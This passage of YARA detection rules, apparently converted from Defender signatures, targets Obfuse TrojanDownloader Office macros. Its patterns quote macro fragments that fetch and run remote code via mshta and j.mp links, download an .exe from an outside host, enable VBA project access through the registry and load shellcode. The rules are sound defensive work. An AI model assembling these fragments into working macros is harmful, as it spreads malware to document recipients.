        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GBST!MTB"
        threat_id = "2147780251"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".DataType = \"bin.base64\"" ascii //weight: 1
        $x_1_2 = {3d 20 53 74 72 43 6f 6e 76 28 [0-37] 28 22 53 45 74 46 57 56 39 44 56 56 4a 53 52 55 35 55 58 31 56 54 52 56 4a 63 55 32 39 6d 64 48 64 68 63 6d 56 63 54 57 6c 6a 63 6d 39 7a 62 32 5a 30 58 45 39 6d 5a 6d 6c 6a 5a 56 77 3d 22 29 2c 20 76 62 55 6e 69 63 6f 64 65 29}  //weight: 1, accuracy: Low
        $x_1_3 = "(\"XFdvcmRcU2VjdXJpdHlcQWNjZXNzVkJPTQ==\"), vbUnicode)" ascii //weight: 1
        $x_1_4 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 2e 52 65 67 57 72 69 74 65 20 [0-37] 2c 20 31 2c 20 22 52 45 47 5f 44 57 4f 52 44 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_5 = "= Chr$(Val(\"&H\" & Mid$" ascii //weight: 1
        $x_1_6 = {3d 20 55 73 65 72 46 6f 72 6d 31 2e 54 65 78 74 42 6f 78 31 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_7 = "= CreateObject(\"msxml2.domdocument\")" ascii //weight: 1
        $x_1_8 = ".createElement(\"code\")" ascii //weight: 1
        $x_1_9 = {2e 6e 6f 64 65 54 79 70 65 64 56 61 6c 75 65 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_10 = {3d 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 56 65 72 73 69 6f 6e 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_11 = ".VBProject.VBComponents(\"ThisDocument\").CodeModule.AddFromString" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GBSV_2147780266_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GBSV!MTB"
        threat_id = "2147780266"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"bin.base64\"" ascii //weight: 1
        $x_1_2 = "= Chr$(Val(\"&H\" & Mid$" ascii //weight: 1
        $x_1_3 = {28 22 53 45 74 46 57 56 39 44 56 56 4a 53 52 22 20 26 20 [0-37] 20 26 20 22 63 6d 39 7a 62 32 5a 30 58 45 39 6d 5a 6d 6c 6a 5a 56 77 3d 22 29 2c 20 76 62 55 6e 69 63 6f 64 65 29}  //weight: 1, accuracy: Low
        $x_1_4 = {28 22 58 46 64 76 63 6d 52 63 55 32 22 20 26 20 [0-37] 20 26 20 22 6a 5a 58 4e 7a 56 6b 4a 50 54 51 3d 3d 22 29 2c 20 76 62 55 6e 69 63 6f 64 65 29}  //weight: 1, accuracy: Low
        $x_1_5 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 22 20 26 20 [0-37] 20 26 20 22 65 6c 6c 22 29 02 00 2e 52 65 67 57 72 69 74 65 20 [0-37] 2c 20 31 2c 20 22 52 45 47 5f 44 57 4f 52 44 22 02 00 45 6e 64 20 57 69 74 68 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_6 = ".VBProject.VBComponents(\"ThisDocument\").CodeModule.AddFromString" ascii //weight: 1
        $x_1_7 = "= CreateObject(\"word.application\")" ascii //weight: 1
        $x_1_8 = "= CreateObject(\"msxml2.domdocument\")" ascii //weight: 1
        $x_1_9 = ".createElement(\"code\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HRV_2147780289_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HRV!MTB"
        threat_id = "2147780289"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "computer2 = \"t\" + \"t\" + \"p\" + \":\" + \"/\" + \"/\" + \"w\" + \"w\" + \"w\"" ascii //weight: 1
        $x_1_2 = {43 61 6c 6c 20 5f 0d 0a 53 68 65 6c 6c 20 5f 0d 0a 28 70 29}  //weight: 1, accuracy: High
        $x_1_3 = "computer3 = \".j.mp/" ascii //weight: 1
        $x_1_4 = "p = mode.computer + mode.computer2 + mode.computer3" ascii //weight: 1
        $x_1_5 = "InputBox \"Password!\": MsgBox \"ERROR! Password Incorrect!\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NZM_2147780311_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NZM!MTB"
        threat_id = "2147780311"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"m\" + \"s\" + \"h\" + \"t\" + \"a h\"" ascii //weight: 1
        $x_1_2 = "= \"t\" + \"t\" + \"p\" + \":\" + \"/\" + \"/\" + \"w\" + \"w\" + \"w\"" ascii //weight: 1
        $x_1_3 = "= \".j.mp/ddsobunbchonteskateesjdw\"" ascii //weight: 1
        $x_1_4 = ".computer2 + calc _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PSB_2147780413_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PSB!MTB"
        threat_id = "2147780413"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Public Sub button1_Click()" ascii //weight: 1
        $x_1_2 = {2e 65 78 65 63 24 20 28 72 69 67 68 74 44 61 74 61 46 75 6e 63 29 02 00 45 6e 64 20 57 69 74 68 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {66 72 6d 2e 62 75 74 74 6f 6e 31 5f 43 6c 69 63 6b 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = "Print #1," ascii //weight: 1
        $x_1_5 = "= CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_6 = "= Split(ActiveDocument.BuiltInDocumentProperties(\"title\"), \" \")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NZZ_2147780449_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NZZ!MTB"
        threat_id = "2147780449"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 72 69 76 61 74 65 20 53 75 62 20 57 6f 72 6b 62 6f 6f 6b 5f 42 65 66 6f 72 65 43 6c 6f 73 65 28 43 61 6e 63 65 6c 20 41 73 20 42 6f 6f 6c 65 61 6e 29 02 00 53 68 65 6c 6c 26 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {68 6f 6c 2e 70 6f 70 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = "Function lol() As String" ascii //weight: 1
        $x_1_4 = {6c 6f 6c 20 3d 20 22 6d 73 68 74 61 20 68 74 74 70 3a 2f 2f 77 77 77 2e 6a 2e 6d 70 2f 6a 61 6f 73 64 6f 61 73 6b 64 61 6f 73 64 22 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NZK_2147780456_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NZK!MTB"
        threat_id = "2147780456"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 72 69 76 61 74 65 20 53 75 62 20 57 6f 72 6b 62 6f 6f 6b 5f 42 65 66 6f 72 65 43 6c 6f 73 65 28 43 61 6e 63 65 6c 20 41 73 20 42 6f 6f 6c 65 61 6e 29 02 00 44 69 6d 20 68 69 6c 6c 20 41 73 20 4e 65 77 20 43 6c 61 73 73 31}  //weight: 1, accuracy: Low
        $x_1_2 = {46 69 6c 65 4e 6f 6f 6d 65 20 3d 20 68 69 6c 6c 2e 46 69 6c 65 4e 78 6d 65 02 00 46 69 6c 65 4e 6c 6c 6d 65 20 3d 20 68 69 6c 6c 2e 46 69 6c 65 4e 6c 6d 65}  //weight: 1, accuracy: Low
        $x_1_3 = {53 68 65 6c 6c 25 20 5f 02 00 20 20 46 69 6c 65 4e 6f 6f 6d 65 20 2b 20 46 69 6c 65 4e 6c 6c 6d 65 2c 20 31 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = {46 75 6e 63 74 69 6f 6e 20 46 69 6c 65 4e 78 6d 65 28 29 02 00 46 69 6c 65 4e 78 6d 65 20 3d 20 22 6d 73 68 74 61 22}  //weight: 1, accuracy: Low
        $x_1_5 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 46 69 6c 65 4e 6c 6d 65 28 29}  //weight: 1, accuracy: Low
        $x_1_6 = "FileNlme = \" http://www.j.mp/ajdddsdiocsjcjosdj\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JRV_2147780476_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JRV!MTB"
        threat_id = "2147780476"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "RtlMoveMemory(Xjpm + Vymnxssy, Tjprz, 1)" ascii //weight: 1
        $x_1_2 = "r = SetPropA(d, \"qdse\", 456)" ascii //weight: 1
        $x_1_3 = "Poiczy = Array(232, 143" ascii //weight: 1
        $x_1_4 = "Xjpm = HeapAlloc(h, 9, UBound(Poiczy))" ascii //weight: 1
        $x_1_5 = "HeapCreate(40001, UBound(Poiczy), UBound(Poiczy)" ascii //weight: 1
        $x_1_6 = "n = ActiveDocument.Name" ascii //weight: 1
        $x_1_7 = "If Len(n) < 25 Then" ascii //weight: 1
        $x_1_8 = "Sub AUtOCLoSe()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VPT_2147780642_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VPT!MTB"
        threat_id = "2147780642"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".exec (sr(tmpIndex))" ascii //weight: 1
        $x_1_2 = "= Join(databaseLoad, \"\")" ascii //weight: 1
        $x_1_3 = "= Split(sr(ActiveDocument.BuiltInDocumentProperties(\"title\")), \" \")" ascii //weight: 1
        $x_1_4 = {28 4c 65 6e 28 [0-20] 29 20 3c 20 31 30 32 34 29 20 54 68 65 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VPT_2147780642_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VPT!MTB"
        threat_id = "2147780642"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".exec (sr(rightButton))" ascii //weight: 1
        $x_1_2 = "= Join(databaseCounter, \"\")" ascii //weight: 1
        $x_1_3 = "= Split(sr(ActiveDocument.BuiltInDocumentProperties(\"title\")), \" \")" ascii //weight: 1
        $x_1_4 = {28 4c 65 6e 28 [0-20] 29 20 3c 20 31 30 32 34 29 20 54 68 65 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VPT_2147780642_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VPT!MTB"
        threat_id = "2147780642"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".exec (sr(databaseRightStorage))" ascii //weight: 1
        $x_1_2 = "= Join(memListbox, \"\")" ascii //weight: 1
        $x_1_3 = "= Split(sr(ActiveDocument.BuiltInDocumentProperties(\"title\")), \" \")" ascii //weight: 1
        $x_1_4 = {28 4c 65 6e 28 [0-20] 29 20 3c 20 31 30 32 34 29 20 54 68 65 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VPT_2147780642_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VPT!MTB"
        threat_id = "2147780642"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".exec (sr(exceptionStorageOption))" ascii //weight: 1
        $x_1_2 = "= Join(countScreenTitle, \"\")" ascii //weight: 1
        $x_1_3 = "= Split(sr(ActiveDocument.BuiltInDocumentProperties(\"title\")), \" \")" ascii //weight: 1
        $x_1_4 = {28 4c 65 6e 28 [0-20] 29 20 3c 20 31 30 32 34 29 20 54 68 65 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KRV_2147780750_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KRV!MTB"
        threat_id = "2147780750"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_2 = ".RegWrite screenValueCount, 1, \"REG_DWORD\"" ascii //weight: 1
        $x_1_3 = "textboxProcedureCollection = CreateObject(\"word.application\")" ascii //weight: 1
        $x_1_4 = " = UserForm1.TextBox1" ascii //weight: 1
        $x_1_5 = "globalMemory = \"\\Word\\Security\\AccessVBOM\"" ascii //weight: 1
        $x_1_6 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 0d 0a 62 75 66 56 61 72 69 61 62 6c 65 49 6e 64 65 78}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LRV_2147780879_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LRV!MTB"
        threat_id = "2147780879"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "HelsWkjzCFxVleNw Lib \"shell32.dll\"" ascii //weight: 1
        $x_1_2 = "UijbGHGF = 1 To Len(IIufyjjb)" ascii //weight: 1
        $x_1_3 = "USERPROFILE & Chr(Asc(s) - 1)" ascii //weight: 1
        $x_1_4 = "s = Mid(enc, i, 1)" ascii //weight: 1
        $x_1_5 = "IcryptOIhiugytFFJgjHFJG(\"fyf/jdud\")" ascii //weight: 1
        $x_1_6 = "Range(\"V1\").Value = \"comprobante de pago\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BRK_2147780929_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BRK!MTB"
        threat_id = "2147780929"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Split(sr(ActiveDocument.BuiltInDocumentProperties(\"title\")), \" \")" ascii //weight: 1
        $x_1_2 = "frm.button1_Click" ascii //weight: 1
        $x_1_3 = {28 4c 65 6e 28 [0-25] 29 20 3c 20 31 30 32 34 29 20 54 68 65 6e}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4a 6f 69 6e 28 [0-25] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = "= ActiveDocument.BuiltInDocumentProperties(\"title\")" ascii //weight: 1
        $x_1_6 = {2e 65 78 65 63 20 28 73 72 28 [0-25] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NZKB_2147780959_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NZKB!MTB"
        threat_id = "2147780959"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 02 00 6d 61 69 6e 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 63 6f 75 6e 74 54 65 78 74 41 72 72 61 79 22 02 00 46 75 6e 63 74 69 6f 6e 20 74 69 74 6c 65 28 29 02 00 74 69 74 6c 65 20 3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 74 69 74 6c 65 22 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = "= GetObject(StrReverse(\"0883F19C0A00-5548-1D11-1A2F-09DFA80C:wen\"))" ascii //weight: 1
        $x_1_4 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 63 6f 75 6e 74 65 72 44 65 6c 65 74 65 22 02 00 53 75 62 20 6d 61 69 6e 28 29 02 00 70 72 6f 63 42 75 74 74 6f 6e 4c 69 73 74 62 6f 78 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NZKC_2147781359_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NZKC!MTB"
        threat_id = "2147781359"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell (\"rundll32.exe \" & Options.DefaultFilePath(wdStartupPath) & \"\\zs.z,XBDOAOUFMRH\")" ascii //weight: 1
        $x_1_2 = "Set FSO = CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_3 = "Search FSO.GetFolder(Options.DefaultFilePath(wdTempFilePath))" ascii //weight: 1
        $x_1_4 = "If Fil.Name = \"fax.f\" Then" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MRV_2147781423_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MRV!MTB"
        threat_id = "2147781423"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "n___d = Chr(sa - 200)" ascii //weight: 1
        $x_1_2 = "n___d(287) & n___d(283) & n___d(267) & n___d(314) & n___d(305) & n___d(312) & n___d(284) & n___d(246) & n___d(315) & n___d(272) & n___d(269) & n___d(308) & n___d(276)" ascii //weight: 1
        $x_1_3 = {66 64 67 73 64 65 72 20 3d 20 32 32 0d 0a 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: High
        $x_1_4 = "sdiuafhupif = \"daskfjdoasi dfiasus dsa89dsf8safu\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NRV_2147781596_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NRV!MTB"
        threat_id = "2147781596"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell i_name" ascii //weight: 1
        $x_1_2 = "Nonce = VirtualMeat + \" \" + VirtualMeat1" ascii //weight: 1
        $x_1_3 = {6f 62 6a 31 2e 43 6c 61 73 73 31 6f 62 6a 0d 0a 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: High
        $x_1_4 = {61 73 73 61 73 2e 4e 65 77 58 0d 0a 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: High
        $x_1_5 = "VirtualMeat1 = UserForm1.Image1.Tag" ascii //weight: 1
        $x_1_6 = "Sub auto_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QRV_2147781797_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QRV!MTB"
        threat_id = "2147781797"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {73 68 65 6c 6c 65 78 65 63 75 74 65 20 5f 0d 0a 63 61 6c 63 63 63 2c 20 46}  //weight: 1, accuracy: High
        $x_1_2 = "GetObject(StrReverse(\"000045355444-E94A-EC11-972C-02690731:wen\"))" ascii //weight: 1
        $x_1_3 = {63 61 6c 63 63 63 20 5f 0d 0a 3d 20 5f 0d 0a 58 20 5f 0d 0a 2b 20 5f 0d 0a 59 20 5f}  //weight: 1, accuracy: High
        $x_1_4 = {54 20 5f 0d 0a 3d 20 5f 0d 0a 22 61 [0-30] 22 0d 0a 45 6e 64 20 5f}  //weight: 1, accuracy: Low
        $x_1_5 = {4b 20 5f 0d 0a 3d 20 5f 0d 0a 22 6a 2e 6d 70 2f 22}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NYDZ_2147781968_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NYDZ!MTB"
        threat_id = "2147781968"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 63 6f 6d 2f 31 37 2f 61 6e 64 72 65 33 34 2e 65 78 3c 00 68 74 74 70 3a 2f 2f 73 63 61 6c 61 64 65 76 65 6c 6f 70 6d 65 6e 74 73 2e 73 63 61 6c 61 64 65 76 63 6f}  //weight: 1, accuracy: Low
        $x_1_2 = "CreateObject(\"wscript.shell\").Run" ascii //weight: 1
        $x_1_3 = "C:\\Users\\Public\\Documents\\electionover.ex" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NYEZ_2147781985_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NYEZ!MTB"
        threat_id = "2147781985"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= CreateObject(\"wscript.shell\").Run" ascii //weight: 1
        $x_1_2 = {68 74 74 70 3a 2f 2f 73 63 61 6c 61 64 65 76 65 6c 6f 70 6d 65 6e 74 73 2e 73 63 61 6c 61 64 65 76 63 6f 2e 63 6f 6d 2f 31 37 2f [0-10] 2e 65 78}  //weight: 1, accuracy: Low
        $x_1_3 = {43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-20] 2e 65 78}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDR_2147782022_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDR!MTB"
        threat_id = "2147782022"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
